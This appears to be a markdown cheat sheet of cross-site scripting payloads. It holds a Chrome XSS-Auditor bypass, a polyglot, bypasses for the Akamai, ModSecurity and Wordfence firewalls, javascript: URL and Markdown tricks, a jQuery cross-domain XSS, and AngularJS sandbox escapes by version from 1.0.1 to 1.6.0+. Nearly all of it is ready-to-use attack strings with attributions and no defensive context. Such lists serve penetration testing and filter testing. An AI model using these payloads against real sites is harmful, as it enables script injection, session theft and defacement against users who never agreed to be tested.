## XSS

**Chrome XSS-Auditor Bypass** by [Masato Kinugawa](https://github.com/masatokinugawa)

```html
<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

**XSS Polyglot** by [Ahmed Elsobky](https://github.com/0xSobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Kona WAF (Akamai) Bypass**

```html
\');confirm(1);//
```

**ModSecurity WAF Bypass**
Note: This kind of depends on what security level the application is set to. See: https://modsecurity.org/rules.html
```html
<img src=x onerror=prompt(document.domain) onerror=prompt(document.domain) onerror=prompt(document.domain)>
```

**Wordfence XSS Bypasses**

```html
<meter onmouseover="alert(1)"
```

```html
'">><div><meter onmouseover="alert(1)"</div>"
```

```html
>><marquee loop=1 width=0 onfinish=alert(1)>
```

**jQuery < 3.0.0 XSS**
 by [Egor Homakov](https://github.com/jquery/jquery/issues/2432)

```js
$.get('http://sakurity.com/jqueryxss')
```

In order to really exploit this jQuery XSS you will need to fulfil one of the following requirements:

1) Find any cross domain requests to untrusted domains which may inadvertently execute script.
2) Find any requests to trusted API endpoints where script can be injected into data sources.

**URL verification bypasses (works without `&#x09;` too)**

```
javas&#x09;cript://www.google.com/%0Aalert(1)
```

**Markdown XSS**

```md
[a](javascript://www.google.com%0Aprompt(1))
```

**AngularJS Template Injection based XSS**

**1.0.1 - 1.1.5** by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 - 1.2.1** by [Jan Horn (Google)](https://twitter.com/tehjh)

```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 - 1.2.5** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

**1.2.6 - 1.2.18** by [Jan Horn (Google)](https://twitter.com/tehjh)

```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 - 1.2.23** by [Mathias Karlsson](https://twitter.com/avlidienbrunn)

```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 - 1.2.29** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

**1.3.0** by [Gábor Molnár (Google)](https://twitter.com/molnar_g)

```
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
```

**1.3.1 - 1.3.2** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf; 
    $eval('x=alert(1)//'); 
}}
```

**1.3.3 - 1.3.18** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 

  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```

**1.3.19** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; 
    $eval('x=alert(1)//'); 
}}

```

**1.3.20** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 - 1.4.9** by [Gareth Heyes (PortSwigger)](https://twitter.com/garethheyes)

```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

**1.5.0 - 1.5.8** by [Ian Hickey](https://twitter.com/ianhickey1024)

```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

**1.5.9 - 1.5.11** by [Jan Horn (Google)](https://twitter.com/tehjh)

```
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

**1.6.0+** (no Sandbox) by [Mario Heiderich (Cure53)](https://twitter.com/0x6D6172696F)

```
{{constructor.constructor('alert(1)')()}}
```
